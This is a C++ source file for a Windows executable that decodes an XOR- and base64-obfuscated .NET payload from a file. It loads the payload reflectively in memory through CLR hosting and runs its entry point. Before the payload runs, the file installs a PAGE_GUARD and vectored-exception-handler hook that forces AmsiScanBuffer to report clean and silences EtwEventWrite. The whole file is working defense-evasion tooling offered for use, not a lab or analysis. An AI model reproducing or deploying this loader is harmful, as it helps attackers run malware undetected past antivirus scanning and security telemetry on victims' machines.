// AMSI + ETW PAGE_GUARD VEH Bypass + Reflective .NET Loader — standalone EXE
//
// Flow:
//   1. Decode payload (base64 + XOR)
//   2. Init CLR (no bypass — CLR uses ETW internally during Start())
//   3. Install AMSI PAGE_GUARD bypass
//   4. Assembly.Load (CLR calls AmsiScanBuffer — intercepted by VEH)
//   5. Reinstall bypass with ETW target added
//   6. Invoke entry point (under AMSI + ETW bypass)

#include <Windows.h>
#include <evntprov.h>
#include <wincrypt.h>
#include <metahost.h>
#include <cstdio>
#include <cstring>
#include "bypass.hpp"

#pragma comment(lib, "mscoree.lib")
#import "mscorlib.tlb" raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref") \
    rename("ReportEvent", "InteropReportEvent")

// ---------------------------------------------------------------------------
// AMSI typedefs
// ---------------------------------------------------------------------------
using HAMSICONTEXT = PVOID;
using HAMSISESSION = PVOID;
using AMSI_RESULT  = ULONG;

static constexpr AMSI_RESULT kAmsiResultClean = 0;

using FnAmsiScanBuffer = HRESULT(WINAPI*)(HAMSICONTEXT, PVOID, ULONG,
                                           LPCWSTR, HAMSISESSION, AMSI_RESULT*);
using FnEtwEventWrite  = ULONG(NTAPI*)(REGHANDLE, PCEVENT_DESCRIPTOR,
                                        ULONG, PEVENT_DATA_DESCRIPTOR);

// ---------------------------------------------------------------------------
// File I/O, Base64, XOR
// ---------------------------------------------------------------------------
static BOOL ReadFileToBuffer(const char* path, BYTE** ppBuf, DWORD* pSize)
{
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD sz = GetFileSize(hFile, nullptr);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hFile); return FALSE; }

    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { CloseHandle(hFile); return FALSE; }

    DWORD read = 0;
    if (!ReadFile(hFile, buf, sz, &read, nullptr) || read != sz)
    {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hFile);
        return FALSE;
    }
    buf[sz] = 0;
    CloseHandle(hFile);

    *ppBuf = buf;
    *pSize = sz;
    return TRUE;
}

static BOOL Base64Decode(const BYTE* b64, DWORD b64Len, BYTE** ppOut, DWORD* pOutLen)
{
    DWORD outLen = 0;
    if (!CryptStringToBinaryA((LPCSTR)b64, b64Len, CRYPT_STRING_BASE64,
                               nullptr, &outLen, nullptr, nullptr))
        return FALSE;

    BYTE* out = (BYTE*)HeapAlloc(GetProcessHeap(), 0, outLen);
    if (!out) return FALSE;

    if (!CryptStringToBinaryA((LPCSTR)b64, b64Len, CRYPT_STRING_BASE64,
                               out, &outLen, nullptr, nullptr))
    {
        HeapFree(GetProcessHeap(), 0, out);
        return FALSE;
    }

    *ppOut   = out;
    *pOutLen = outLen;
    return TRUE;
}

static void XorDecode(BYTE* buf, DWORD len, BYTE key)
{
    for (DWORD i = 0; i < len; ++i)
        buf[i] ^= key;
}

// ---------------------------------------------------------------------------
// CLR hosting
// ---------------------------------------------------------------------------
struct ClrContext
{
    ICLRMetaHost*          pMetaHost;
    ICLRRuntimeInfo*       pRuntimeInfo;
    ICorRuntimeHost*       pCorHost;
    mscorlib::_AppDomain*  pAppDomain;
    mscorlib::_Assembly*   pAssembly;
    mscorlib::_MethodInfo* pEntryPoint;
    LONG                   paramCount;
};

static HRESULT ClrInit(ClrContext& ctx)
{
    ZeroMemory(&ctx, sizeof(ctx));
    HRESULT hr;

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&ctx.pMetaHost);
    if (FAILED(hr)) { printf("[-] CLRCreateInstance: 0x%08X\n", hr); return hr; }

    IEnumUnknown* pEnum = nullptr;
    hr = ctx.pMetaHost->EnumerateInstalledRuntimes(&pEnum);
    if (FAILED(hr)) return hr;

    IUnknown* pUnk = nullptr;
    while (pEnum->Next(1, &pUnk, nullptr) == S_OK)
    {
        if (ctx.pRuntimeInfo) ctx.pRuntimeInfo->Release();
        pUnk->QueryInterface(IID_PPV_ARGS(&ctx.pRuntimeInfo));
        pUnk->Release();
    }
    pEnum->Release();

    if (!ctx.pRuntimeInfo)
    {
        printf("[-] No .NET runtime found\n"); return E_FAIL;
    }

    WCHAR ver[64] = {};
    DWORD verLen = _countof(ver);
    ctx.pRuntimeInfo->GetVersionString(ver, &verLen);
    printf("[+] CLR: %ls\n", ver);

    hr = ctx.pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
                                         (LPVOID*)&ctx.pCorHost);
    if (FAILED(hr))
    {
        // .NET 4.x: start via ICLRRuntimeHost to register in-process class factory,
        // then CoCreateInstance(CLSID_CorRuntimeHost) succeeds.
        ICLRRuntimeHost* pTmp = nullptr;
        if (SUCCEEDED(ctx.pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost,
                                                      (LPVOID*)&pTmp)))
        {
            pTmp->Start();
            pTmp->Release();
        }
        CoInitializeEx(NULL, COINIT_MULTITHREADED);
        hr = CoCreateInstance(CLSID_CorRuntimeHost, NULL, CLSCTX_INPROC_SERVER,
                               IID_ICorRuntimeHost, (LPVOID*)&ctx.pCorHost);
        if (FAILED(hr)) { printf("[-] CLR host: 0x%08X\n", hr); return hr; }
    }

    hr = ctx.pCorHost->Start();
    if (FAILED(hr) && hr != S_FALSE)
    {
        printf("[-] CLR Start: 0x%08X\n", hr); return hr;
    }

    IUnknown* pAppDomainUnk = nullptr;
    hr = ctx.pCorHost->GetDefaultDomain(&pAppDomainUnk);
    if (FAILED(hr)) { printf("[-] GetDefaultDomain: 0x%08X\n", hr); return hr; }

    hr = pAppDomainUnk->QueryInterface(__uuidof(mscorlib::_AppDomain),
                                        (LPVOID*)&ctx.pAppDomain);
    pAppDomainUnk->Release();
    if (FAILED(hr)) { printf("[-] QI _AppDomain: 0x%08X\n", hr); return hr; }

    return S_OK;
}

static HRESULT ClrLoadAssembly(BYTE* peBytes, DWORD peLen, ClrContext& ctx)
{
    SAFEARRAYBOUND saBound = { peLen, 0 };
    SAFEARRAY* pSA = SafeArrayCreate(VT_UI1, 1, &saBound);
    if (!pSA) return E_OUTOFMEMORY;

    void* saData = nullptr;
    SafeArrayAccessData(pSA, &saData);
    memcpy(saData, peBytes, peLen);
    SafeArrayUnaccessData(pSA);

    HRESULT hr = ctx.pAppDomain->Load_3(pSA, &ctx.pAssembly);
    SafeArrayDestroy(pSA);
    if (FAILED(hr) || !ctx.pAssembly)
    {
        printf("[-] Assembly.Load: 0x%08X\n", hr);
        return FAILED(hr) ? hr : E_FAIL;
    }

    hr = ctx.pAssembly->get_EntryPoint(&ctx.pEntryPoint);
    if (FAILED(hr) || !ctx.pEntryPoint)
    {
        printf("[-] No entry point: 0x%08X\n", hr);
        return FAILED(hr) ? hr : E_FAIL;
    }

    SAFEARRAY* pParamInfos = nullptr;
    hr = ctx.pEntryPoint->GetParameters(&pParamInfos);
    if (SUCCEEDED(hr) && pParamInfos)
    {
        LONG lb = 0, ub = -1;
        SafeArrayGetLBound(pParamInfos, 1, &lb);
        SafeArrayGetUBound(pParamInfos, 1, &ub);
        ctx.paramCount = ub - lb + 1;
        SafeArrayDestroy(pParamInfos);
    }
    return S_OK;
}

static HRESULT ClrInvoke(ClrContext& ctx, int argc, wchar_t** argv)
{
    VARIANT vtRet, vtObj;
    VariantInit(&vtRet);
    VariantInit(&vtObj);
    vtObj.vt = VT_NULL;

    SAFEARRAY* pParams = nullptr;

    if (ctx.paramCount > 0)
    {
        // Build string[] from command-line args
        SAFEARRAYBOUND argBound = { (ULONG)argc, 0 };
        SAFEARRAY* pArgsSA = SafeArrayCreate(VT_BSTR, 1, &argBound);
        for (LONG i = 0; i < argc; ++i)
        {
            BSTR bstr = SysAllocString(argv[i]);
            SafeArrayPutElement(pArgsSA, &i, bstr);
            SysFreeString(bstr);
        }

        SAFEARRAYBOUND paramBound = { 1, 0 };
        pParams = SafeArrayCreate(VT_VARIANT, 1, &paramBound);
        LONG idx = 0;
        VARIANT vtArgs;
        VariantInit(&vtArgs);
        vtArgs.vt = VT_ARRAY | VT_BSTR;
        vtArgs.parray = pArgsSA;
        SafeArrayPutElement(pParams, &idx, &vtArgs);
    }
    else
    {
        SAFEARRAYBOUND paramBound = { 0, 0 };
        pParams = SafeArrayCreate(VT_VARIANT, 1, &paramBound);
    }

    HRESULT hr = ctx.pEntryPoint->Invoke_3(vtObj, pParams, &vtRet);
    SafeArrayDestroy(pParams);

    VariantClear(&vtRet);
    return hr;
}

static void ClrCleanup(ClrContext& ctx)
{
    if (ctx.pEntryPoint)  ctx.pEntryPoint->Release();
    if (ctx.pAssembly)    ctx.pAssembly->Release();
    if (ctx.pAppDomain)   ctx.pAppDomain->Release();
    if (ctx.pCorHost)     ctx.pCorHost->Release();
    if (ctx.pRuntimeInfo) ctx.pRuntimeInfo->Release();
    if (ctx.pMetaHost)    ctx.pMetaHost->Release();
    ZeroMemory(&ctx, sizeof(ctx));
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int wmain(int argc, wchar_t* argv[])
{
    printf("[*] AMSI + ETW PAGE_GUARD VEH bypass + .NET loader\n\n");

    HMODULE hAmsi  = LoadLibraryW(L"amsi.dll");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hAmsi || !hNtdll) { printf("[-] LoadLibrary failed\n"); return 1; }

    auto fnScan = (FnAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
    auto fnEtw  = (FnEtwEventWrite) GetProcAddress(hNtdll, "EtwEventWrite");
    if (!fnScan || !fnEtw) { printf("[-] GetProcAddress failed\n"); return 1; }

    // -------------------------------------------------------------------
    // 1. Decode payload
    // -------------------------------------------------------------------
    BYTE* b64Buf = nullptr;  DWORD b64Len = 0;
    BYTE* peBytes = nullptr; DWORD peLen = 0;

    if (!ReadFileToBuffer("data.txt", &b64Buf, &b64Len))
    {
        printf("[-] Failed to read data.txt\n"); return 1;
    }

    if (!Base64Decode(b64Buf, b64Len, &peBytes, &peLen))
    {
        printf("[-] Base64 decode failed\n");
        SecureZeroMemory(b64Buf, b64Len);
        HeapFree(GetProcessHeap(), 0, b64Buf);
        return 1;
    }
    SecureZeroMemory(b64Buf, b64Len);
    HeapFree(GetProcessHeap(), 0, b64Buf);

    XorDecode(peBytes, peLen, 0x4B);

    if (peLen < 2 || peBytes[0] != 'M' || peBytes[1] != 'Z')
    {
        printf("[-] Invalid PE\n");
        SecureZeroMemory(peBytes, peLen);
        HeapFree(GetProcessHeap(), 0, peBytes);
        return 1;
    }
    printf("[+] Payload decoded: %lu bytes\n", peLen);

    // -------------------------------------------------------------------
    // 2. Init CLR (no bypass — CLR uses ETW during Start())
    // -------------------------------------------------------------------
    ClrContext clr = {};
    HRESULT hr = ClrInit(clr);
    if (FAILED(hr))
    {
        ClrCleanup(clr);
        SecureZeroMemory(peBytes, peLen);
        HeapFree(GetProcessHeap(), 0, peBytes);
        return 1;
    }
    printf("[+] CLR ready\n");

    // -------------------------------------------------------------------
    // 3. AMSI bypass (PAGE_GUARD) → Assembly.Load
    // -------------------------------------------------------------------
    AddBypassTarget((PVOID)fnScan, S_OK, 6, kAmsiResultClean);
    if (!InstallBypass())
    {
        printf("[-] AMSI bypass failed\n");
        ClrCleanup(clr);
        SecureZeroMemory(peBytes, peLen);
        HeapFree(GetProcessHeap(), 0, peBytes);
        return 1;
    }

    hr = ClrLoadAssembly(peBytes, peLen, clr);
    SecureZeroMemory(peBytes, peLen);
    HeapFree(GetProcessHeap(), 0, peBytes);

    if (FAILED(hr))
    {
        printf("[-] Assembly load failed: 0x%08X\n", hr);
        UninstallBypass();
        ClrCleanup(clr);
        return 1;
    }
    printf("[+] Assembly loaded\n");

    // -------------------------------------------------------------------
    // 4. Add ETW bypass → Invoke entry point
    // -------------------------------------------------------------------
    UninstallBypass();
    AddBypassTarget((PVOID)fnScan, S_OK, 6, kAmsiResultClean);
    AddBypassTarget((PVOID)fnEtw, ERROR_SUCCESS);
    InstallBypass();
    printf("[+] AMSI + ETW bypass active\n");

    // argv[0] = наш exe, передаём argv+1 чтобы .NET получил только свои аргументы
    hr = ClrInvoke(clr, argc - 1, argv + 1);

    // May not reach here if assembly calls Environment.Exit()
    UninstallBypass();
    ClrCleanup(clr);

    return FAILED(hr) ? 1 : 0;
}
